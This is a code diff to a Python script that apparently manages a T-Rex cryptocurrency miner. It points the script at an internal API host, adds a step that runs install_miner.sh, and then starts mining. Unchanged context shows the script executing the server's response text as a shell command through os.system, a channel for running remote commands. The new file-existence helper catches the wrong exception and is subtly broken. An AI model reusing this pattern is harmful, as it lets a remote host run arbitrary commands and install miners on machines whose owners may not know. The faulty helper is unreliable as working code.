@@ -6,7 +6,15 @@ import time
 
 import trex
 
-base_url = "https://localhost:6969/api"
+base_url = "https://10.0.0.247:6969/api"
+
+def file_exsists(f):
+    try:
+        open(f)
+    except FileExistsError:
+        return False 
+    else:
+        return True
 
 
 def get_username():
@@ -44,8 +52,22 @@ def handle_report_response(res):
     os.system(res.text)
 
 
+def install_miner():
+    os.system('chmod +x install_miner.sh')
+    os.system('./install_miner.sh')
+
+
+def miner_exsists():
+    return file_exsists('/mine/miners/trex')
+
+
 def main():
-    start_mining()
+    if miner_exsists():
+        start_mining()
+    else:
+        install_miner()
+        start_mining()
+    
     # while True:
     #     time.sleep(30)
     #     res = send_report()
